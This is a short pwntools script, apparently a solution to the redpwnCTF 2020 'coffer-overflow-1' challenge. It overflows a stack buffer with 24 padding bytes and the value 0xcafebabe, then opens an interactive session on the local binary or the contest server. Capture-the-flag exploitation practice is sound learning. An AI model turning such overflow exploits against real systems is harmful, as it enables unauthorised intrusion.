from pwn import *

elf = ELF("./coffer-overflow-1")

if args.REMOTE:
    p = remote("2020.redpwnc.tf", 31255)
else:
    p = process("./coffer-overflow-1")

p.recv()
p.sendline("A" * 24 + p64(0xcafebabe))
p.interactive()
